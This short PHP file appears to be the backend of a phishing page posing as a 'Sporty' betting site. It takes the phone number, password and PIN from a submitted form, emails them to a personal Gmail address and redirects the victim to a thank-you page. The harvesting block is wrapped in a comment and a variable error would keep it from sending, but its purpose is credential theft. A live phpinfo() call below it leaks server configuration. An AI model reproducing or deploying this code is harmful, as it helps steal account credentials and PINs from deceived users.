<!-- <?php
//get data from form  

$phone = $_POST['phone'];
$password= $_POST['password'];
$pin= $_POST['pin'];

$to = "mezieprogrammer@gmail.com";

$subject = "Mail From Sporty website";
$txt ="Phone = ". $phone . "\r\n  Password = " . $password . "\r\n Pin =" . $pin;
$headers = "From: noreply@codeconia.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
// ?> -->
<?php phpinfo(); ?>